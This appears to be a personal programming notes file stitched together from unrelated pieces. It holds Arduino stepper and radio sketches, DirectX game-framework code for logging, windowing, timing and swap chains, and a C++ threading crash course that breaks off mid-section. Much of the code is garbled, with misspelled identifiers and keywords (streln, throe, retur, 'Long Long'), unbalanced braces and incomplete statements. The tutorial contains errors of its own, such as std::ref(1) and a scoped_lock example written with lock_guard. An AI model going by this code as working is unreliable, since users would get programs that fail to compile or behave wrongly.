$$V_{out} = (V_{in} \times R_{2})/ (R_{1} + R_{2})$$


------------------------------------------------------------------------------

Stepper Motor 
---------------------

#include <Stepper.h>
const int stepsPerRevolution = 90;
// change this to fit the number of steps per revolution
// for your motor
// initialize the stepper library on pins 8 through 11:
Stepper myStepper(stepsPerRevolution, 8, 9, 10, 11);
//stepper library 

void setup() {
   // set the speed at 60 rpm:
   myStepper.setSpeed(5);
   // initialize the serial port:
   Serial.begin(9600);
}

void loop() {
   // step one revolution in one direction:
   Serial.println("clockwise");
   myStepper.step(stepsPerRevolution);
   delay(500);
   // step one revolution in the other direction:
   Serial.println("counterclockwise");
   myStepper.step(-stepsPerRevolution);
   delay(500);
}




Tone library 
------------------



Wireless Communication 
--------------------------

Transmitter
--------------
#include<VirtualWire.h>
char *controller;

void setup()
{
pinMode(13,OUTPUT);
vw_set_ptt_inverted(true); //ptt pin
vw_set_tx_pin(12); // tx pin

vw_setup(4000);

}

void loop()
{
controller = "1";
vw_send((uint8_t  *)controller, strlen(controller));
vw_wait_tx();
digitalWrite(13,1);
delay(2000);
controller = "0";
vw_send((uint8_t * ) controller, streln(controller));
vw_wait_tx();
digitalWrite(13,0);
delay(2000);

}


Receiver 
---------

void setup()
{
vw_set_ptt_inverted(true);
vw_set_rx_pin(12);
vw_setup(4000);
pinMode(5, OUTPUT);
vw_rx_start();

}

void loop()
{
uint8_t buf[VW_MAX_MESSAGE_LEN];
uint8_t buflen = VW_MAX_MESSAGE_LEN;
if(vw_get_message(buf, &buflen))
if(buf[0] == '1')
}
digitalWrite(5,1);
}
if(buf[0] == '0')
{
digitalWrite(5,0);

}

}

}

-----------------------------------------------------------------------------------------

DIrectX file Log
---------------------

#include <ShlObj.h>
#include <Shlwapi.h>
#include <Pathcch.h>

#include "log.h"

#pragma comment(lib, "Shlwapi.h")
#pragma comment(lib, "Pathcch.lib")

namespace util 
{
bool FileLogPolicy::openOutputStream(const std:wstring& filename)
{
PWSTR docPath = NULL;
HRESULT hr = SHGetKnownFolderPath(FOLDERID_Doucment, NULL, NULL, &docPath);

ifndef NDEBUG 
if(FAILED(hr))
return false;

#endif
std::wstringstream path;
path << docPath << L"\\bell0bytes\\meAfvan\\logs\\";
::CoTaskMemFree(static_cast<void*>(docPath));
hr = SHCreateDirectory(NULL,path.str().c_str());

#ifndef NDEBUG
		if (FAILED(hr))
			return false;
#endif

path << filename.c_str();
outputStream.open(path.str().c_str(), std::ios_base::binary | std::ios_base::out);

#ifndef NDEBUG
		if (!outputStream.is_open())
			return false;
#endif
		// set output precision
		outputStream.precision(20);

		// return success
		return true;
	}


void FileLogPolicy::closeOutputStream()
{
outputStream.close();

}

void FileLogPolicy::write(const std::string& msg)
{
outputStream << msg <<std::endl;
}

}
}


------------------------------------------------------------------------
log.h
-------------
#include <Windows.h>
#include <atomic>							// atomic objects (no data races) 
#include <thread>							// individual threats
#include <mutex>							// lockable objects
#include <iostream>							// input and output streams
#include <sstream>							// string streams
#include <fstream>							// file streams
#include <vector>							// vector containers
#include <map>	


template util 
{
class LogPolicyInterface
{
public:
virtual ~LogPolicyInterface() noexcpet = default;

virtual bool openOutputStream(const std::wstring& name) = 0 ;
virtual void closeOutputStream() = 0;
virtual void write(const std::string& msg) = 0;

};

class FileLogPolicy : public LogPolicyInterface{
private:
std::ofstream outputstream;

public:
 FileLogPolicy() : outputStream() {};
 ~FileLogPolicy() {};
 
 bool openOutputStream(const std::wstring& filename) override;
		void closeOutputStream() override;
		void write(const std::string& msg) override;
};

enum SeverityType
{
info = 0,
debug,
warning,
error,
};

template<typename LogPolicy>
class Logger;
 template<typename LogPolicy>
 void loggingdeamon(Logger<LogPolicy>* logger)
 {
 
 //dump log data if present 
 
 std::uniquelock<std::timed_mutex> lock(logger->writeMutex,std::defer_lock);
 
 do{
 std:this_thread::sleep_for(std::chrono::milliseconds{ 50 });
 if(logger->logBuffer.size())
 {
 if(!lock.try_lock_for(std::chrono::milliseconds{ 50 });
 continue;
 for(auto& x : logger->logBuffer)
 logger->policy.write(x);
 logger->logBuffer.clear();
 lock.unlock();
 
 }
 }
 while(logger->isStillRunning.test_and_set() ||logger->logBuffer.size());
 
 }
}

template<typename LogPolicy>
class Logger
{
private:
unisgned int logLineNumber;
std::map<std::thread::id, std::string> threadName;
LogPolicy policy;
std::timed_mutex writeMutex;
std::vector<std::string> logBuffer;
std::thread daemon;
std::atomic_flag isStillRunning{ATOMIC_FLAG_INT};

public :
 Logger(const std::wstring& name);
 ~Logger();
 
 void 
}

------------------------------------------------------------------------------------------

Window.h
-----------

#include <Windows.h>
#include <"expected.h">

namespace core{
class DirectXApp;

class Window{
private:
HWND mainWindow;
DirectXApp* dxApp;
util:Expected<void> init();


public:
Window(DirectXApp* dxApp);
~Window();

inline HWND getMainWindowHandle() 
{
return mainWindow;
};
virtual LRESULT CALLBACK msgProc(HWND hwnd, unsigned int msg, WPARAM wParam, LPARAM lParam);
friend class DirectXApp;

};
}

---------------------------------------------------------------------------------------------------------

window.cpp-
-----------------------------------------

#include"window.h"
#include "app.h"
#include "serviceLocator.h"

namespace 
{
core:Window* window = NULL;

}

namespace core{
LRESULT CALLBACK mainWndProc(HWND hWnd, unsigned int msg, WPARAM wParam, LPARAM lParam)
{
return window->msgProc(hWnd, msg, wParam, lParam);

}

Window::Window(DirectXApp* dxApp) : mainWindow(NULL), dxApp(dxApp)
{
window = this;
util::Expected<void> rv = this->init();
if(!rv.isValid())
{
try{
rv.get();
}
catch (std::exception& e)
{
std::stringstream errorMessage;
erroMessage << "Creation of the game Window failed with : "<<e.what();
util::ServiceLocator::getFileLogger()->print<util::SeverityType::error>(std::stringstream(errorMessage.str()));

throe std::runtime_error("Window creation failed!");

}
}
}

Window::~Window()
{
if(mainWindow)
mainWindow = NULL;

if(dxApp)
dxApp = NULL;

util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("MainWindow was susccessful.");

}

util::Expected<void> Window::init()

{
WNDCLASSEX wc;

wc.cbClsExtra = 0;
wc.cbSize = sizeof(WNDCLASSEX);
wc.cbWndExtra = 0;
wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSB);
wc.hCursor = LoadCursor(0,IDC_ARROW);
wc.hIcon = LoadIcon(0, IDI_APPLICATION);
wc.hInstance = dxApp->appInstance;
wc.lpfnWndProc - mainWndProc;
wc.lpszClassName = L"bell0Window";
wc.lpsz.MenuName = 0;
wc.style = CS_HREDRAW | CS_VREDRAW;


if(!RegisterClassEx(&wc))
return std::invalid_argument("the window class could not be registered!");

mainWindow = CreateWindowEx(WS_EX_OVERLAPWINDOW, wc.lpszClassName,L"bell0Window", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,NULL,NULL,dxApp-appInstance, NULL);
if(!mainWindow)
return std::invalid_argument("The window could not be created !");
ShowWindow(mainWindow, SW_SHOW);
UpdateWindow(mainWindow);
util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("the main window was created successfully.");
return {};

}

LRESULT CALLBACK Window::msgProc(HWND hWnd,  unsigned msg, WPARAM wParam, LPARAM lParam)
{

switch (msg)
{
case WM_DESTROY:
util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("The main Window was flagged for destruction.");
PostQuitMessage(0);
return 0;

}

return DefWindowProc(hWnd, msg,wParam,lParam);

}
}


-----------------------------------------------------------------------------------------------------

VERTEX_SHADER
------------------
float4 main(float3 pos : POSITION) : SV_POSITION
{
float4 homoPos = {pos.x,pos.y,pos.z,1.0f};

retur homoPos;

}

---------------------------------------------------------------

#include "expected.h"

// CLASSES //////////////////////////////////////////////////////////////////////////////
namespace core
{
	class Timer
	{
	private:
		// times measured in counts
		long long int startTime;			// time at the start of the application
		long long int totalIdleTime;		// total time the game was idle
		long long int pausedTime;			// time at the moment the game was paused last
		long long int currentTime;			// stores the current time; i.e. time at the current frame
		long long int previousTime;		    // stores the time at the last inquiry before current; i.e. time at the previous frame

		// times measured in seconds
		double secondsPerCount;			    // reciprocal of the frequency, computed once at the initialization of the class
		double deltaTime;					// time between two frames, updated during the game loop

		// state of the timer
		bool isStopped;					    // true iff the timer is stopped

	public:
		// constructor
		Timer();
		~Timer();

		// getters: return time measured in seconds
		double getTotalTime() const;		// returns the total time the game has been running (minus paused time)
		double getDeltaTime() const;		// returns the time between two frames

		// methods
		util::Expected<void> start();		// starts the timer, called each time the game is unpaused
		util::Expected<void> reset();		// sets the counter to zero, called once before message loop
		util::Expected<void> tick();		// called every frame, lets the time tick
		util::Expected<void> stop();		// called when the game is paused
	};
}
----------------------------------------------------------------------



#include <Windows.h>

// bell0bytes core
#include "timer.h"

// bell0bytes util
#include "serviceLocator.h"


namespace core
{
Timer::Timer() : startTime(0),totalIdleTime(0), pausedTime(0), currentTime(0), previousTime(0),deltaTime(0.0),isStopeed(false),secondsPerCount(0.0)
{
Long Long int frequency = 0;
if(!QueryPeformanceFrequency((LARGE_INTEGER*)&frequency))
{
secondsPerCount = 1.0 / (double)frequency;

#ifndef NDEBUG
util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("The high precision ");
#endif
}
else
}
throw mstd::runtime_error("ERROR");;


}
Timer::~Timer()
{
#ifndef NDEBUG
		// log success
		util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("The timer was successfully destroyed.");
#endif
}

double Timer::getDeltaTime() const{
return deltaTime;

}

double Timer::getTotalTime() const{
if(isStopeed)
return 
(
pausedTime - startTime - totalIdleTime
) * secondsPerCount;
else
return (currentTime - startTime -= totalIdleTime)*secondsPerCount;
}

util::Expected<void> Timer::reset()
{
Long Logn int now = 0;
if(QueryPerformanceCounter((LARGE_INTEGER*)&now))
{
startTime = now;
previousTime = now;
pausedTime = 0;
isStopeed = false;

#ifndef NDEBUG
util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("The timer is set ");
#endif

return {};

}else
return std::runtime_error("Unable");

}
util::Expected<void> Timer::start()

{
if(isStopped)
{
Long Long int now = 0;
if(QueryPeformanceCounter((LARGE_INTEGER*)&now))
{
totalIdleTime += (now-pausedTime);
previousTime = now;
pausedTime = 0;
isStopped = false;

#ifndef NDEBUG 
util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("The timer was started.");
#endif
return {};

}else
return  std::runtime_error("Error");

}

		// return success
		return {};
	}

	util::Expected<void> Timer::stop()
	{
		// this function stops the timer (if it is currently running)
		if (!isStopped)
		{
			long long int now = 0;
			if (QueryPerformanceCounter((LARGE_INTEGER*)&now))
			{
				// set the time the timer was stopped to "now"
				pausedTime = now;
				isStopped = true;

#ifndef NDEBUG
				util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("The timer was stopped.");
#endif

				// return success
				return {};
			}
			else
				// unable to query the performance counter, throw an error
				return std::runtime_error("Unable to query the performance counter!");
		}

		// return success
		return {};
	}

	util::Expected<void> Timer::tick()
	{
		// this function lets the timer tick, i.e. it computes the time that has elapsed between two frames
		if (isStopped)
		{
			// if the game is stopped, the elapsed time is obviously 0
			deltaTime = 0.0;

			// return success
			return {};
		}
		else
		{
			// get the current time
			if (QueryPerformanceCounter((LARGE_INTEGER*)&currentTime))
			{
				// compute the time elapsed since the previous frame
				deltaTime = (currentTime - previousTime) * secondsPerCount;

				// set previousTime to currentTime, as in the next tick, this frame will be the previous frame
				previousTime = currentTime;

				// deltaTime can be negative if the processor goes idle for example
				if (deltaTime < 0.0)
					deltaTime = 0.0;

				// return success
				return {};
			}
			else
				// unable to query the performance counter, throw an error
				return std::runtime_error("Unable to query the performance counter!");
		}
	}

}
--------------------------------------------------------------------------------------------
StringConverter
------------------
#include "stringconverter.h"
namespace util
{
std::wstring StringConverter::s2ws(const std::string& str)
{
using convert_typeX = std::codecvt_utf8<wchar_t>;
std::wstring_convert<vonvert_typeX, wchar_t> converterX;
return converterX.from_bytes(str);

}

std::string StringConverter::ws2s(const std::wstrong& wstr)
{
using convert_typeX = std::codecvt_utf8<wchar_t>;
std::wstring_convert<convert_typeX, wchar_t> converterX;

return converterX.to_bytes(wstr);


}
}
------------------------------------------------------------------------------------------------------------------


Lets start a course 
--------------------------
#include <windows.h>
#include <exception>
#include <stdexcept>

bool nurDerBVB(int x)
{

if (x == 4)
throw std::invali_argument("I dont like");
if(x == 9)
return true;
else
return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nshowCmd)
{
try{
nurDerBVB(4);

}
catch(std::invali_argument)
{
return -1;
}
return 0;

}


----------------------------------------------------------------
Expected
--------------

#include <atomic>

namespace util
{
template<class T>
class Expected{
protected: union
{
T result;
std::exception_ptr spam;

};

bool gotResult;
Expected(){};

public:

Expected(const T& r) : result(r), gotResult(true) {}
Expected(T&& r) : result(std::move(r)), gotResult(true) {}
Expected(const Expected& e) : gotResult(r.gotResult)
{
if(gotResult)
new(&result) T(e.result);
else
new(&spam) std::exception_ptr(e.spam);

}
Expected(Expected&& e)  :gotResult(e.gotResult)

if(gotResult)
new(&result) T(std::move(e.result));
else
new (&spam) std::exception_ptr(std::move(e.spam));

}
~Expected() {}


void swap(Exeption& e)
{
if (gotResult)
			{
				if (e.gotResult)
					std::swap(result, e.result);
				else
				{
					auto t = std::move(e.spam);
					new(&e.result) T(std::move(result));
					new(&spam) std::exception_ptr;
					std::swap(gotResult, e.gotResult);
				}
			}
			else
			{
				if (e.gotResult)
					e.swap(*this);
				else
					spam.swap(e.spam);
			}
		}

		// creating expect from exceptions
		template<typename E>
		Expected<T>(E const& e) : spam(std::make_exception_ptr(e)) { }

		template<class E>
		static Expected<T> fromException(const E& exception)
		{
			if (typeid(exception) != typeid(E))
				throw std::invalid_argument("slicing detected!\n");
			return fromException(std::make_exception_ptr(exception));
		}
		static Expected<T> fromException(std::exception_ptr p)
		{
			Expected<T> e;
			e.gotResult = false;
			new(&e.spam) std::exception_ptr(std::move(p));
			return e;
		}
		static Expected<T> fromException()
		{
			return fromException(std::current_exception());
		}

		// operator overload
		Expected<T>& operator=(const Expected<T>& e)
		{
			gotResult = e.gotResult;
			if (gotResult)
				new(&result) T(e.result);
			else
				new(&spam) std::exception_ptr(e.spam);
			return *this;
		}

		// getters
		bool isValid() const { return gotResult; };
		bool wasSuccessful() const { return gotResult; };

		T& get()
		{
			if (!gotResult)
				std::rethrow_exception(spam);
			return result;
		}
		const T& get() const
		{
			if (!gotResult)
				std::rethrow_exception(spam);
			return result;
		}

		// probe for exception
		template<class E>
		bool hasException() const
		{
			try
			{
				if (!gotResult)
					std::rethrow_exception(spam);
			}
			catch (const E& object)
			{
				(void)object;
				return true;
			}
			catch (...)
			{

			}
			return false;
		}

		friend class Expected<void>;
	};

	template<>
	class Expected<void>
	{
		std::exception_ptr spam;

	public:
		// constructors and destructor
		template <typename E>
		Expected(E const& e) : spam(std::make_exception_ptr(e)) { }
		template<typename T>
		Expected(const Expected<T>& e)
		{
			if (!e.gotResult)
				new(&spam) std::exception_ptr(e.spam);
		}

		Expected(Expected&& o) : spam(std::move(o.spam)) { }
		Expected() : spam() {}

		// operator overload
		Expected& operator=(const Expected& e)
		{
			if (!e.isValid())
				this->spam = e.spam;
			return *this;
		};

		// getters
		bool isValid() const { return !spam; }
		bool wasSuccessful() const { return !spam; }
		void get() const { if (!isValid()) std::rethrow_exception(spam); }
	};
}

--------------------------------------------------------------------------------------------------------
Swap Chain 
-----------

typedef struct DXGI_SWAP_CHAIN_DESC
{
DXGI_MODE_DESC  BufferDesc;
DXGI_SAMPLE_DESC  SampleDesc;
DXGI_USAGE         BufferUsage;
UINT			BufferCount;
HWND		OutputWindow;
BOOL     	Windowed;
DXGI_SWAP_EFFECT 	 SwapEffect;
UINT			Flags;
}DXGI_SWAP_CHAIN_DESC;




typedef struct DXGI_MODE_DESC
{
UINT  Width;
UINT  Height;
DXGI_RATIONAL RefreshRate;
DXGI_FORMAT  Format;
DXGI_MODE_SCANLINE_ORDER ScanlineOrdering;
DXGI_MODE_SCALING Scaling;

}DXGI_MODE_DESC;





typedef struct DXGI_SAMPLE_DESC
{
UINT Count;
UINT Quality;
}DXGI_SAMPLE_DESC;





DXGI_SWAP_CHAIN_DESC scd;
scd.BufferDesc.Width = 0;
scd.BufferDesc.Height = ;
sc.BufferDesc.RefreshRate.Numerator = 0;
scd.BufferDesc.RefreshRate.Denominator = 1;
scd.BufferDesc.Format = desiredColourFormat;
scd.BufferDesc.ScanlineOrdering = DXGI_MODE_SCALING_ORDER_UNSPECIFIED;
scd.BufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;
scd.SampleDesc.Count = 1;
scd.SampleDesc.Quality = 0;
scd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
scd.BufferCount = 3;
scd.OutputWindow = dxApp->appWindow->getMainWindowHandle();
scd.Windowed = true;
scd.SwapEffect = DXGI_SWAP_EFFECT_FLIP_DISCARD;
scd.Flags = DXGI_SWAP_CHAIN_ALLOW_MODE_SWITCH;





Microsoft::WRL::ComPtr<IDXGIDevice> dxgiDevice;
Microsoft::WRL::ComPtr<IDXGIAdapter> dxgiAdapter;
Microsoft::WRL::ComPtr<IDXGIFactory> dxgiFactory;


HRESULT hr = dev.As(&dxgiDevice);
if (FAILED(hr))
return std::runtime_error("Error");
hr = dxgiDevice->GetAdapter(dxgiAdapter.GetAddressOf());
if(FAILED(hr))
return std::runtime_error("error");
hr = dxgiAdapter->GetParent(__uuidof(IDXGIFactory), 
&dxgiFactory);
if(FAILED(hr))
return std::runtime_error("the error");




HRESULT CreateSwapChain
(
[in] IUnknown  	*pDevice,
[in]  DXGI_SWAP_CHAIN_DESC *pDesc,
[out]  IDXGISwapChain  **ppSwapChain

);


hr = dxgiFactory->CreateSwapChain(dev.Get(), &scd, swapChain.GetAddressOf());
if(FAILED(hr))
return std::runtime_error("error");

HRESULT Present(
UINT SyncInterval,
UINT Flags
);



HRESULT ResizeBuffers(UINT BufferCount,
UINT Width,
UINT Height,
DXGI_FORMAT NewFormat,
UINT SwapChainFlags
);



util::Expected<void> Direct3D::onResize()
{
if(FAILED(swapChain->ResizeBuffers(0,0,0,desiredColourFormat,0)))
return std::runtime_error("error");
return{};

}





----------------------------------------------------

for full screen 
------------------
swapChain->SetFullscreenState(false, nullptr);
-----------------------------------------------------------------------

# Advanced C++ Crash Course (Threading and Concurrency)

Author: methylDragon  
Contains an advanced syntax reference for C++  
This time, we'll be going through C++ multithreading and concurrency related stuff!    

------

## Pre-Requisites

**Assumed knowledge (This is a C++ crash course, not a basic coding tutorial)**

- How **variables, loops, conditionals, etc**. work (Basic coding fundamentals will help a lot!)
- Linux (**Terminal/Console proficiency**) (We're going to need to compile our stuff)
- Gone through the all preceding parts of the tutorial
- Some familiarity with threading will help



## Table Of Contents <a name="top"></a>

1. [Introduction](#1)    
2. [C++ Threading Reference](#2)    
   2.1 [Threads](#2.1)    
   2.2 [Creating Threads](#2.2)    
   2.3 [Thread Specific Functions](#2.3)    
   2.4 [Sharing Data](#2.4)    
   2.5 [Waiting, Killing, and Detaching](#2.5)    
   2.6 [Race Conditions](#2.6)    
   2.7 [Atomics](#2.7)    
   2.8 [Mutex and Locks](#2.8)    
   2.9 [A Better Way: Lock Guards](#2.9)    
   2.10 [Lock Guard Types](#2.10)    
   2.11 [Exclusive Locks vs Shared Locks](#2.11)    
   2.12 [Mutex Types](#2.12)    
   2.13 [Event Handling: Condition Variables](#2.13)    
3. [C++ Concurrency Reference](#3)    
   3.1 [Introduction](#3.1)    
   3.2 [When to Use Threads or Tasks](#3.2)    
   3.3 [Promises and Futures](#3.3)    
   3.4 [A Simple Promise-Future Example](#3.4)    
   3.5 [Async](#3.5)    
   3.6 [Async Launch Policies](#3.6)    
   3.7 [Different Ways to Call Async](#3.7)    




## 1. Introduction <a name="1"></a>

![_images/concurrency_vs_parallelism.png](assets/concurrency_vs_parallelism-1562918749730.png)

[Image Source](<https://msl-network.readthedocs.io/en/latest/concurrency_async.html>)

Everyone likes threading ja. Why not make such an efficient language such as C++ even more efficient with multi-threading.

We're going to talk about the nice `std::thread` class that abstracts away the low level POSIX threads or p threads library in C. We'll also talk about `std::async` for asynchronous thread generation, as well as a bit on locks and atomic types.



## 2. C++ Threading Reference <a name="2"></a>

### 2.1 Threads <a name="2.1"></a>
[go to top](#top)


![img](assets/threads-as-control-flow.png)

[Image Source](<https://kholdstare.github.io/technical/2012/08/21/objects-and-threads-in-cpp-1.html>)

You can use the [std::thread](<http://www.cplusplus.com/reference/thread/thread/>) class to start threads. Each instance of this thread represents and wraps and manages a single execution thread.

![_images/concurrency_vs_parallelism.png](assets/concurrency_vs_parallelism-1562918749730.png)

[Image Source](<https://msl-network.readthedocs.io/en/latest/concurrency_async.html>)

Threads will run **concurrently** if they're on the same processor. But ***in parallel*** if they're on different processors!

Each thread has its own call stack, but **all threads share the heap.**

You can find the maximum number of active threads that you can start. If your number of active threads exceeds this number you won't really get more performance out of it, so take note!

```c++
#include <thread>

unsigned int c = std::thread::hardware_concurrency();
```



### 2.2 Creating Threads <a name="2.2"></a>
[go to top](#top)


There are several ways to create a thread:

- Using a **function pointer**
- Using a **lambda function**
- Using a **functor**

**Function Pointer**

```c++
#include <thread>

// Define a function and start a thread that runs that function
void rawr(param) {}
std::thread rawr_thread(foo, params);
```
**Lambda Function**
```c++
// Define a lambda expression and start a thread that runs that lambda expression
auto rar = [](params) {};
std::thread rar_thread(rar, params);

// Or pass the lambda directly!
std::thread rar_thread([](params) {};, params);
```
**Functor**
```c++
// Define a functor and start a thread that runs the functor's function call
class raa_object_class {
  void operator()(params) {}
}

std::thread raa_thread(raa_class_object(), params);
```

> Don't create threads on the heap with the new operator! Do it automatically on the stack for efficiency like in the examples stated above.



### 2.3 Thread Specific Functions <a name="2.3"></a>
[go to top](#top)


Use `std::this_thread` within threads to refer to the current thread!

**Note that yield() is NOT like the Python yield! It's completely different behaviour.**

```c++
#include <thread>
#include <chrono>

// These can be used within a thread

// Get thread ID of thread
std::this_thread::get_id();

// Give priority to other threads, pause execution
std::this_thread::yield();

// Sleep for some amount of time
std::this_thread::sleep_for(std::chrono::seconds(1));

// Sleep until some time
std::chrono::system_clock::time_point time_point = std::chrono::system_clock::now()
                                                   + std::chrono::seconds(10);
std::this_thread::sleep_until(time_point);
```



### 2.4 Sharing Data <a name="2.4"></a>
[go to top](#top)


**Global Variables**

All global and static variables that are initialised at compile time can be accessed by threads. Since the threads should know the addresses for them.

#### **Passing By Reference**

All parameters passed to a function when starting a thread are **passed by value**, even if you defined in the function to pass by reference!

You need to **explicitly wrap the arguments in std::ref() to pass by reference.**

Example:

```c++
void ref_function(int &a, int b) {}

std::thread ref_function_thread(ref_function, std::ref(1), 2);
```

**Because the thread functions can't return anything, passing by reference is the only way to properly get data out of a thread without using global variables.** Ensure that your thread modifies the data passed in by reference and you should be good to go.

#### **A Note on Static Variables**

Be wary of declaring static variables in a multiple threads though!

```c++
// Suppose this is your thread function
void method()
{
  static int var = 0;
  var++;
}
```

**Note that this does NOT create a separate instance of the static variable per thread instance.** This is because static variables are initialised once when the compiler goes over their declaration.

If you want to have 'static' variables that are static within the scope of each particular thread, use `thread_local` variables instead. Then each thread will have its own version of the static variable, and the static variable will only be destroyed on thread exit.

```c++
void method()
{
  thread_local int var = 0;
  var++;
}
```



### 2.5 Waiting, Killing, and Detaching <a name="2.5"></a>
[go to top](#top)


#### **Waiting to Complete**

You use the `join()` method to wait for a thread to complete.

Calling `join()` will **block the main thread** until the thread that is being waited for completes.

```c++
// Start thread example_thread
std::thread example_thread(some_function); 

// Block and wait for thread to finish
example_thread.join();

// Ok! We're done and good to go on doing other stuff ...
```

**You cannot join a thread if it is not joinable** (maybe you killed it already, or it was detached.)

```c++
// So you can check if a thread is joinable before calling the join method!
if (exmaple_thread.joinable())
{
  example_thread.join(); 
}
```

#### **Kill a Thread**

Use `return`, **not** `std::terminate()`! `terminate()` will kill your entire program process, not an individual thread. 

```c++
return;
```

#### **Detaching a Thread**

You may `detach` a thread. That is, split it from the `std::thread()` object that manages it. Once you do that, you won't be able to manage the thread aside from any mutex or shared resources between the different threads.

Those detached threads will only exit when the main process is terminated or when the top level function exits.

```c++
example_thread.detach();
```



### 2.6 Race Conditions <a name="2.6"></a>
[go to top](#top)


![SharedMutable](assets/SharedMutable.png)

[Image Source](<https://www.modernescpp.com/index.php/c-core-guidelines-rules-for-concurrency-and-parallelism>)

It's always thread-safe if you're only reading variables from multiple threads. But the moment you start writing data from multiple threads, you can potentially crash or create unexpected behaviour.

**Example**

```c++
// Source: https://stackoverflow.com/questions/34510/what-is-a-race-condition

if (x == 5) // The "Check"
{
   y = x * 2; // The "Act"

   // If another thread changed x in between "if (x == 5)" and "y = x * 2" above,
   // y will not be equal to 10.
}
```



### 2.7 Atomics <a name="2.7"></a>
[go to top](#top)


So there are several ways to prevent race conditions. An `std::atomic` is just one way.

An atomic type is mainly a type that implements atomic operations. That is, operations that are thread safe and run independently of any other processes. There can be some overhead, especially when there is a lot of contention around them, but it's hard to get into details for how much overhead exactly, since it's platform and context specific.

Using an atomic type **guarantees no race conditions will occur.** 

> **Use atomic types only when you need them, and native types when you don't. If you care about performance, that is.**

You can check the [Atomic Types Reference](<https://en.cppreference.com/w/cpp/atomic/atomic>) for the full list of how to instantiate them, but here's a couple of examples.

**There's a gigantic list! This table is non-exhaustive:**

|    Type Alias    | Type Instantiation  |
| :--------------: | :-----------------: |
| std::atomic_bool | `std::atomic<bool>` |
| std::atomic_char | `std::atomic<char>` |
| std::atomic_int  | `std::atomic<int>`  |
| std::atomic_long | `std::atomic<long>` |
|        .         |          .          |
|        .         |          .          |
|        .         |          .          |



### 2.8 Mutex and Locks <a name="2.8"></a>
[go to top](#top)


#### **Introduction**

We'll go through this for completeness' sake, but there is a better way to do things (lock guards.)

**Mutexes** are mutual exclusion objects that are used for thread synchronisation. They're a way to keep track of whether a particular thread is using a resource, and will cause threads to block if the resource is currently being taken. It's a way to **protect shared resources and to prevent race conditions.**

They are **owned** by the thread that takes it. Hence, **mutual exclusion!**

This will slow down your threaded program if threads wait too much, so use them sparingly! But you still need to use them to prevent race conditions and to really control the multi-threaded program flow of your program.

They are the **interface** through which you can engage locks for your code!

#### **Deadlocks**

Of course, you need to be careful when you're using mutexes and locks. Overuse of locks will slow down your code, or in certain cases, cause deadlocks, causing your program to completely stall.

![Image result for deadlock](assets/deadlock.png)

[Image Source](<https://www.geeksforgeeks.org/operating-system-process-management-deadlock-introduction/>)

> **Methods for handling deadlock**
>
> 1) **Deadlock prevention or avoidance**: The idea is to not let the system into deadlock state.
> One can zoom into each category individually, Prevention is done by negating one of above mentioned necessary conditions for deadlock.
>
> 2) **Deadlock detection and recovery**: Let deadlock occur, then do preemption to handle it once occurred.
>
> 3) **Ignore the problem all together**: If deadlock is very rare, then let it happen and reboot the system. This is the approach that both Windows and UNIX take.
>
> <https://www.geeksforgeeks.org/operating-system-process-management-deadlock-introduction/>

#### **Example Usage**

> Note that this method is **not recommended**. It's actually an [**anti-pattern**](<http://kayari.org/cxx/antipatterns.html#locking-mutex>) but just included for completeness' sake.

```c++
#include <mutex>

// Create your mutex here
std::mutex my_mutex;

// 
thread_function()
{
  my_mutex.lock(); // Acquire lock
  // Do some non-thread safe stuff...
  my_mutex.unlock(); // Release lock
}
```



### 2.9 A Better Way: Lock Guards <a name="2.9"></a>
[go to top](#top)


It's actually better to just use a lock guard, which manages the lifecycle of a mutex for you.

It's kind of like the `with:` operator in Python.

**Notably, a lock guard releases the lock automatically once the function that it is called in goes out of scope!**

```c++
#include <mutex>

// Create your mutex here
std::mutex my_mutex;
 
thread_function()
{
  std::lock_guard<std::mutex> guard(my_mutex); // Acquire lock
  // Do some non-thread safe stuff...
}
```



### 2.10 Lock Guard Types <a name="2.10"></a>
[go to top](#top)


So there are actually several lock guard types.

You've already seen the standard lock_guard

#### **std::lock_guard<>**

[Reference](<https://en.cppreference.com/w/cpp/thread/lock_guard>)

- Simplest lock guard
- Takes a mutex on construction
- Releases the mutex once it goes out of scope

```c++
std::lock_guard<std::mutex> guard(my_mutex);
```

#### **std::scoped_lock<>**

[Reference](<https://en.cppreference.com/w/cpp/thread/scoped_lock>)

This was introduced in C++17, and is the standard lock guard to use, over `std:;lock_guard<>`, which is included for compatibility.

- It's just a lock guard
- Except it can take **multiple mutexes**

```c++
std::lock_guard<std::mutex, std::mutex> guard(mutex_1, mutex_2);
```

#### **std::unique_lock<>**

[Reference](<https://en.cppreference.com/w/cpp/thread/unique_lock>)

- Just like the normal lock guard, except...
- It initialises an exclusive lock
- It can be returned from the function without releasing the lock (via move semantics)
- It can be released before it is destroyed
- You can also use **nifty lock methods!**

```c++
std::unique_lock<std::mutex> guard(my_mutex);

// Check if guard owns lock (either works)
guard.owns_lock();
bool(guard);

// Return function without releasing the lock
return std::move(guard);

// Release lock before destruction
guard.unlock();
```

If you defer the locks, you can use the **nifty lock methods!**

```c++
// Initialise the lock guard, but don't actually lock yet
std::unique_lock<std::mutex> guard(mutex_1, std::defer_lock);

// Now you can do some of the following!
guard.lock(); // Lock now!
guard.try_lock(); // Won't block if it can't acquire
guard.try_lock_for(); // Only for timed_mutexes
guard.try_lock_until(); // Only for timed_mutexes
```

#### **std::shared_lock<>**

[Reference](<https://en.cppreference.com/w/cpp/thread/shared_lock>)

A shared lock is just like a unique lock, except the lock is a shared lock as opposed to an exclusive one.

- Just like the normal lock guard, except...
- It initialises a shared lock
- It can be returned from the function without releasing the lock (via move semantics)
- It can be released before it is destroyed
- You can also use **nifty lock methods!**

```c++
std::shared_lock<std::mutex> guard(my_mutex);

// Check if guard owns lock (either works)
guard.owns_lock();
bool(guard);

// Return function without releasing the lock
return std::move(guard);

